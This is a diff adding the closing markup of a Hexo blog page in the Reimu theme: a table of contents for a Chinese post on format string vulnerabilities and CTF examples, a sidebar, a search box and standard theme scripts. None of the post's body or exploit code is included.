+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text"> 格式化字符串漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-number">1.1.</span> <span class="toc-text"> 概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">1.2.</span> <span class="toc-text"> 格式化字符串</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%A0%BC%E5%BC%8F"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 基本格式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#parameter"><span class="toc-number">1.2.1.1.</span> <span class="toc-text"> parameter</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#length"><span class="toc-number">1.2.1.2.</span> <span class="toc-text"> length</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#field-width"><span class="toc-number">1.2.1.3.</span> <span class="toc-text"> field width</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#type%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8D%A0%E4%BD%8D%E7%AC%A6%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.2.1.4.</span> <span class="toc-text"> type(格式化字符串占位符类型)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#di"><span class="toc-number">1.2.1.4.1.</span> <span class="toc-text"> %d&#x2F;%i</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#u"><span class="toc-number">1.2.1.4.2.</span> <span class="toc-text"> %u</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#xx"><span class="toc-number">1.2.1.4.3.</span> <span class="toc-text"> %x&#x2F;%X</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#lx"><span class="toc-number">1.2.1.4.4.</span> <span class="toc-text"> %lx</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#p"><span class="toc-number">1.2.1.4.5.</span> <span class="toc-text"> %p</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#xlxp%E7%9A%84%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.2.1.4.5.1.</span> <span class="toc-text"> %x,%lx,%p的建议</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#s"><span class="toc-number">1.2.1.4.6.</span> <span class="toc-text"> %s</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#c"><span class="toc-number">1.2.1.4.7.</span> <span class="toc-text"> %c</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#n"><span class="toc-number">1.2.1.4.8.</span> <span class="toc-text"> %n</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1n%E7%9A%84%E8%A1%8D%E7%94%9F"><span class="toc-number">1.2.1.4.8.1.</span> <span class="toc-text"> ①%n的衍生</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2n%E5%8F%8A%E5%85%B6%E8%A1%8D%E7%94%9F%E7%9A%84%E4%BD%BF%E7%94%A8%E5%B0%8F%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.2.1.4.8.2.</span> <span class="toc-text"> ②%n及其衍生的使用小建议</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95"><span class="toc-number">1.3.</span> <span class="toc-text"> 攻击手法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E9%80%9A%E8%BF%87ida%E6%88%96%E8%80%85%E5%85%B6%E5%AE%83%E8%83%BD%E5%8F%8D%E7%BC%96%E8%AF%91%E7%9A%84%E5%B7%A5%E5%85%B7%E5%AF%BB%E6%89%BE%E6%9C%89%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.1.</span> <span class="toc-text"> ①.通过IDA（或者其它能反编译的工具)寻找有格式化字符串漏洞的函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E6%89%BE%E5%88%B0%E6%BC%8F%E6%B4%9E%E5%87%BD%E6%95%B0%E5%90%8E%E9%80%9A%E8%BF%87nc%E8%BF%9E%E6%8E%A5%E5%90%8E%E6%B1%82%E5%81%8F%E7%A7%BB%E9%87%8F"><span class="toc-number">1.3.2.</span> <span class="toc-text"> ②.找到漏洞函数后，通过nc连接后，求偏移量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E5%9B%A0%E9%A2%98%E8%80%8C%E5%BC%82"><span class="toc-number">1.3.3.</span> <span class="toc-text"> ③.因题而异</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">1.4.</span> <span class="toc-text"> 例题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1hnctf-2022-week1fmtstrres%E7%9A%84%E5%9F%BA%E7%A1%80%E5%BA%94%E7%94%A8"><span class="toc-number">1.4.1.</span> <span class="toc-text"> ①.[HNCTF 2022 Week1]fmtstrre（%s的基础应用)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2cgfsbn%E7%9A%84%E5%9F%BA%E7%A1%80%E7%94%A8%E6%B3%95"><span class="toc-number">1.4.2.</span> <span class="toc-text"> ②.CGfsb(%n的基础用法)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#32021-%E9%B9%A4%E5%9F%8E%E6%9D%AFlittleof%E4%BD%BF%E7%94%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E6%B3%84%E9%9C%B2canary%E5%80%BC"><span class="toc-number">1.4.3.</span> <span class="toc-text"> ③.[2021 鹤城杯]littleof（使用格式化字符串漏洞泄露Canary值)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E8%84%9A%E6%9C%AC%E9%80%89%E5%AF%B9libcso%E7%9A%84%E7%89%88%E6%9C%AC%E5%8D%B3%E5%8F%AFimage"><span class="toc-number">1.5.</span> <span class="toc-text"> 运行脚本，选对libc.so的版本即可
+</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.6.</span> <span class="toc-text"> 总结：</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Dusk" class="lazyload">
+  <div class="sidebar-author-name">Dusk</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">14</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">2</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">5</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+      <div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div class="reimu-search-input" id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/images/reimu.png"/>
+        </div>
+      </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+  
+<script src="/js/generator_search.js" defer></script>
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.0.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+<script data-pjax>
+  var updateTime = _$('#post-update-time')?.innerHTML;
+
+  if (updateTime) {
+    const update = new Date(updateTime);
+    const now = new Date();
+    const diff = now - update;
+    const days = diff / 86400000;
+    const { daysAgo, message: template } = window.REIMU_CONFIG.outdate;
+    if (days >= daysAgo) {
+      const message = template.replace(/{time}/, updateTime);
+      const blockquote = _$('#outdate-blockquote');
+      if (blockquote) {
+        blockquote.querySelector('p').innerText = message;
+        blockquote.style.display = 'block';
+      }
+    }
+  }
+</script>
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
+
